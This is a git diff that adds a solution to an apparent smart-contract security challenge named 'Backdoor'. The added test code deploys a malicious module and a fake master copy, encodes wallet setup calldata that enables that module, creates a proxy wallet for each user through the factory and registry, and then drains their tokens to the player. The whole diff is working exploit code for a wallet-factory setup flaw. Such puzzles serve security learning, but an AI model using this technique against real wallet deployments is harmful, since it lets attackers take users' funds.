@@ -46,6 +46,39 @@ describe('[Challenge] Backdoor', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const MaliciousModule = await ethers.getContractFactory('MaliciousModule');
+        const maliciousModule = await MaliciousModule.deploy(token.address, player.address);
+        await maliciousModule.deployed();
+        const FakeMaster = await ethers.getContractFactory('FakeMaster');
+        const fakeMaster = await FakeMaster.deploy();
+        await fakeMaster.deployed();
+
+        let setUpABI = [
+            `function setup(
+              address[] calldata _owners,
+              uint256 _threshold,
+              address to,
+              bytes calldata data,
+              address fallbackHandler,
+              address paymentToken,
+              uint256 payment,
+              address payable paymentReceiver)`,
+        ];
+        let enableMaliciousABI = [
+            `function enableMaliciousModule(address _module)`,
+        ];
+        const setUpInterface = new ethers.utils.Interface(setUpABI);
+        const enableMaliciousInterface = new ethers.utils.Interface(enableMaliciousABI);
+        
+        const data = enableMaliciousInterface.encodeFunctionData('enableMaliciousModule', [maliciousModule.address]);
+        let victimWallets = [];
+        for (i = 0; i < users.length; i++) {
+            const setUpData = setUpInterface.encodeFunctionData('setup', [[users[i]], 1, fakeMaster.address, data, ethers.constants.AddressZero, ethers.constants.AddressZero, 0, ethers.constants.AddressZero]);
+            await walletFactory.createProxyWithCallback(masterCopy.address, setUpData, 0, walletRegistry.address);
+            victimWallets.push(await walletRegistry.wallets(users[i]));
+            expect(await token.balanceOf(victimWallets[i])).to.eq(ethers.utils.parseEther('10'));
+        }
+        await maliciousModule.connect(player).execute(victimWallets);
     });
 
     after(async function () {
